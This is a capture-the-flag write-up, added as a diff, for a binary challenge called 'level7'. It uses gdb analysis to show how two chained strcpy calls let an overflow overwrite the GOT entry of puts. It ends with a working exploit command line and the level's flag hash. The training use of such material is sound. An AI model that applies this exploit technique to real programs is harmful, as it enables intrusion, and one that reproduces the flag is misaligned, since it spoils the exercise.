@@ -1,0 +1,104 @@
+
+██╗     ███████╗██╗   ██╗███████╗██╗         ███████╗
+██║     ██╔════╝██║   ██║██╔════╝██║         ╚════██║
+██║     █████╗  ██║   ██║█████╗  ██║             ██╔╝
+██║     ██╔══╝  ╚██╗ ██╔╝██╔══╝  ██║            ██╔╝ 
+███████╗███████╗ ╚████╔╝ ███████╗███████╗       ██║  
+╚══════╝╚══════╝  ╚═══╝  ╚══════╝╚══════╝       ╚═╝  
+
+objdump -d level7
+
+There is two functions: <main> and <m>
+The function <m> is never called and print the flag we need.
+
+gdb level7
+
+disas main
+
+<+178>:   call   0x8048430 <fopen@plt>
+<+202>:   call   0x80483c0 <fgets@plt> 
+// Open the file that contains the flag and get its content.
+
+strings level7
+->/home/user/level8/.pass
+
+Copy the binary file in /tmp and eplace : "/home/user/level8/.pass" by "/home/user/level7/.pass"
+(To open a file on which we have rights)
+
+When we provides two arguments the program displays "~~", otherwise it segfault.
+
+Look at what he is doing with our two arguments:
+
+Breakpoint at first <strcpy>
+
+b *main+127
+
+run ABC DEF
+
+x/x $esp+4
+-> 0xbffff91c
+
+x/s 0xbffff91c
+-> "ABC"
+
+The first <strcpy> is using our first argument as second parameter (const char *src).
+By doing the same test, we notice the second <strcpy> does the same for our second argument.
+Considering that our arguments are used in the two strcpy we can try to buffer overflow them.
+
+run AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
+
+It segfaulting inside the libc.
+
+We verify if it's segfaulting in one of the strcpy by setting a breakpoint under each of the two strcpy.
+
+b *main+132 // First strcpy
+b *main+161 // Second strcpy
+
+run AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
+
+The First strcpy passed normally.
+
+continue
+
+Segfault at the second strcpy.
+
+We set a breakpoint at the second strcpy to verify the arguments that are passed to him.
+
+b *main+156
+
+run AAAAAAAAAAAAAAAAAAAAAAAAAAA BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
+
+x/x $esp
+-> 0x41414141
+
+The overflow on the first strcpy wrote on the first argument of the second strcpy (const char *dst).
+
+x/x $esp+4
+-> 0xbffff8fe
+
+x/s 0xbffff8fe
+-> "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB"
+
+The second parameter of this strcpy (src) has not been altered. It can be still used.
+
+Our goal is to call the <m> function.
+However, it must be called after the fget was executed (after the flag has been stored).
+
+Our goal is to call the <m> function.
+However, it must be called after it has done the fget (so that the password has been recovered).
+
+A remarkable coincidence, we have a call to puts that is just after the fgets.
+We can use it to make a call at the function <m> at this time.
+We just have to write the address of the <m> function in the GOT of the <puts> function.
+
+objdump -R level7
+-> 08049928 R_386_JUMP_SLOT   puts
+
+Write at the GOT address of <puts> (0x08049928), the address of <m> function (0x080484f4).
+
+./level7 `python -c "print 'A' * 20 + '\x28\x99\x04\x08'"` `python -c "print '\xf4\x84\x04\x08'"`
+
+|══════════════════════════════════════════════════════════════════|
+| 5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9 |
+|══════════════════════════════════════════════════════════════════|
+
